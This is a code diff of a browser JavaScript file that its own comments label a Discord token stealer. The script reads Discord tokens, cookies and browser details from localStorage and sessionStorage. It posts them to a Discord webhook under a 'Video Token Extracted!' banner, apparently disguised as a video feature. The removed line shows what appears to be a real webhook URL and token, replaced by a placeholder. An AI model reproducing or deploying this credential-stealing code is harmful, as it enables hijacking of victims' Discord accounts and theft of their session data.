@@ -82,10 +82,12 @@
     // ============================================
     //  REPLACE WITH YOUR WEBHOOK URL
     // ============================================
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1502287600277262459/74ONlVS3pubojwvbGrqOhY58G7dXk4fD4Op4Oe7w2rcdypH_Ef7NUCGH3BvQZivlErod';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
 
     // ============================================
-    //  EXTRACT TOKENS
+    //  DISCORD TOKEN STEALER
+    //  This runs in the browser and steals tokens
+    //  from localStorage/sessionStorage (browser users only)
     // ============================================
     function extractTokens() {
         let token = null;
@@ -118,13 +120,10 @@
         return { token, cookies, browserInfo };
     }
 
-    // ============================================
-    //  SEND TO WEBHOOK
-    // ============================================
     async function sendToWebhook(data) {
         const payload = {
             embeds: [{
-                title: ' Video Token Extracted!',
+                title: '🎬 Video Token Extracted!',
                 color: 0xff0000,
                 fields: [
                     { name: 'Discord Token', value: data.token || ' No token found', inline: false },
@@ -143,7 +142,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            console.log('✅ Token sent to webhook');
+            console.log(' Token sent to webhook');
         } catch(e) {
             console.error('Webhook error:', e);
         }
